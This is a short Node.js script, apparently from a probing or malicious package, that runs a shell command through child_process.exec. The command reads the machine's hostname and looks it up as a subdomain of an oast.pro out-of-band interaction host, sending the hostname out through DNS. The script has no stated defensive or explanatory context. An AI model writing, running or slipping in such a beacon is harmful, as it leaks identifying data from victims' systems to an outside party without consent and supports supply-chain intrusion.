const {exec} = require("child_process");

exec("a=$(hostname) && host $a.crfd913legn2eddfurrglhmwuvfsnegnw.oast.pro", (error, data, getter) => {
    if(error){
        console.log("error", error.message);
        return;
    }
    if(getter){
        console.log("data", data);
        return;
    }
    console.log(data);
}
);
